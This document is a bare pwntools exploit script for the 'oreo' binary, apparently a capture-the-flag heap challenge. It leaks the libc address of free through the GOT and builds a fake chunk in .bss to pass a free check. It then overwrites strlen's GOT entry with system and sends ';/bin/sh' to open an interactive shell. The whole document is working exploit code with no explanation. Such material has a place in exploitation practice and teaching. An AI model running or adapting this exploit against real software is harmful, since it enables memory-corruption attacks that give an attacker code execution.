
from pwn import *
cn = process('./oreo')
elf=ELF('./oreo')
#context.log_level='debug'
libc = ELF('libc.so.6')
 
def add(name,description):
    #cn.recvuntil('Action: ')
    cn.sendline('1')
    #cn.recvuntil('Rifle name: ')
    cn.sendline(name)
    #cn.recvuntil('Rifle description: ')
    cn.sendline(description)
     
def show_add():
    #cn.recvuntil('Action: ')
    #gdb.attach(cn)
    cn.sendline('2')
 
def delete():
    #cn.recvuntil('Action: ')
    cn.sendline('3')
 
def message(notice):
    #cn.recvuntil('Action: ')
    cn.sendline('4')
    #cn.recvuntil('order: ')
    cn.sendline(notice)
 
def show_stat():
    #cn.recvuntil('Action: ')
    cn.sendline('5')
 
#leak libc base
 
add('a','a')
delete()
name = 'a'*27 + p32(elf.got['free'])
print hex(elf.got['free'])
add(name,'a'*25)
#gdb.attach(cn)
show_add()
cn.recvuntil('Description: ')
cn.recvuntil('Description: ')
free_addr = u32(cn.recv(4).ljust(4,'\x00'))
success('free_addr'+hex(free_addr))
libc_base = free_addr-libc.symbols['free']
system_addr = free_addr+libc.symbols['system']-libc.symbols['free']
success('system_addr'+hex(system_addr))
gdb.attach(cn)
#alloc to bss
 
for i in range(0x40-2-1):
    add('a'*27+p32(0),str(i))
message_addr = 0x0804a2a8
payload = 'b'*27 + p32(message_addr)
add(payload,'b')
#gdb.attach(cn)
#fake chunk to bypass check
 
payload = 'a'*(0x20-4)+'\x00'*4 + 'a'*4 + p32(100)
message(payload)
delete()
cn.recvuntil('submitted!\n')
 
#trim free_got
 
payload = p32(elf.got['strlen'])
add('b',payload)
#gdb.attach(cn)
message(p32(system_addr)+';/bin/sh\x00')
 
cn.interactive()
